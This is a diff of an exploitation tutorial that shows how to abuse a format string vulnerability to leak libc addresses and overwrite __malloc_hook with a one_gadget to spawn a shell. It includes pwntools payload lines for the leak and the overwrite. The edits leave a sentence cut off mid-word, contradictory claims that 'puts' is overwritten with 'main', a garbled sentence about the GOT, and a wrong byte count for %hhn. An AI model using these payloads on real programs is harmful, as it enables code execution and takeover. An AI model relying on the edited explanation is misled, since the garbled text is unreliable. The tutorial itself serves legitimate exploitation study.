@@ -12,7 +12,7 @@ A detailed guide to exploiting a format string vulnerability to spawn a shell by
 
 # Foreword
 
-This is going to be a detailed explaination of how can we overwrite the libc functions by calling them wby abusing other functions as of it's implementation. Stay tuned, I hope you will like it.
+This is going to be a detailed explaination of how can we overwrite the libc functions by calling them by abusing other functions as of it's implementation. Stay tuned, I hope you will like it.
 
 # What is Format String?
 
@@ -435,8 +435,8 @@ Breaking down the exploit:-
 `p = '%{}c%18$hn'.format(elf.symbols['main'] & 0xffff)` - This line is very important and interesting as well, so let me tell you how this works
 
 ```python
->>> hex(p.symbols['__libc_csu_init'])
-'0x4008c0'
+>>> hex(p.symbols['puts'])
+'0x4005bc'
 >>> hex(p.symbols['main'])
 '0x400805'
 >>> 
@@ -449,11 +449,11 @@ As you can see only lower 2 bytes of the address differs between those two which
 >>> 0x805
 2053
 ```
-Same stuff, so `AND` operation is useful. Now we already knew that the offset for `__libc_csu_init` is at 18 and we need to write only `2053` bytes just to overwrite the `__libc_csu_init` with `main`, so we do:-
+Same stuff, so `AND` operation is useful. Now we already knew that the offset for `puts` is at 18 and we need to write only `2053` bytes just to overwrite the `puts` with `main`, so we do:-
 
 `%2053c%18$hhn` - This write exactly 2053 characters to the stdout and then because of `hhn` it overwrites those lower 2 bytes and changes it to main.
 
-We are overwriting the `__libc_csu_init` with the `main` and after that we are adding the GOT entry of `puts`. Why `puts` is because we can push this address to stacj and then use it afterwards. Because of `fgets` we have to use `\x00` aka null bytes as `fgets` will be terminated as soon as any new lines get encountered.
+We are overwriting the `puts` with the `main` and after that we are adding the GOT entry of `puts`. Because of `fgets` we have to use `\x00` aka null bytes as `fgets` will be terminated as soon as any new lines get encountered.
 
 Let's run this:-
 
@@ -554,14 +554,13 @@ Start              End                Offset             Perm Path
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
 ```
 
-##### Overwriting malloc_hook and spawning shell via one gadget
-
-Why malloc?
-
->If we have a read only .GOT section, then the "standard" attack of overwriting the GOT will not work. In this case, we look for alternative areas that can be overwritten (preferably function pointers). Some such areas are: __malloc_hook (see man page for the same), stdin's vtable pointer to write or flush, etc. In such a scenario, having access to the libc sources is extremely useful. As for overwriting the __malloc_hook, it works even if the application doesn't call malloc, since it is calling printf (or similar), and internally, if we pass a width specifier greater than 64k (say %70000c), then it will call malloc, and thus whatever address was specified at the global variable __malloc_hook.
+##### Overwriting LIBC GOT symbol and spawning shell via one gadget
 
 
-Now, we know that there's no GOT function that we can overwrite other than the `__malloc_hook` itself by just providing a large amount of character width to the printf it will automatically calls it.
+I'm gonna use `__malloc_hook` for overwriting with the `one gadget`. We can overwrite any GOT entry, the difference would be number of bytes that has to be written. Calling the `malloc` would be easy enough with `printf` and eventua
+>Whenever there is a large amount of characters provided as a specifier then the `printf` calls `malloc` in order to allocate overlaying chunks.
+
+Now, we know that there's no GOT function that we can overwrite `__malloc_hook` itself by just providing a large amount of character width to the printf it will automatically calls it.
 
 Now, I'm using one gadget which is without a doubt one of the best thing we could use in a time like this, for our final payload we will just overwrite the function and pass our payload by changing the higher and lower bits of `__malloc_hook` with of `one_gadget`. Now, we will do:-
 
@@ -605,10 +604,10 @@ s.sendlineafter('name? ', payload)
 
 payload = '%18$s'
 payload += '\x00' * (48 - len(payload))
-payload += p64(elf.got['fgets'])
+payload += p64(elf.got['setvbuf'])
 s.sendlineafter('name? ', payload)
 s.recvuntil('Hello ')
-libc.address = u64(s.recv(6).ljust(8, '\x00')) - libc.symbols['fgets']
+libc.address = u64(s.recv(6).ljust(8, '\x00')) - libc.symbols['setvbuf']
 print 'libc @ ' + hex(libc.address)
 
 addr = libc.symbols['__malloc_hook']
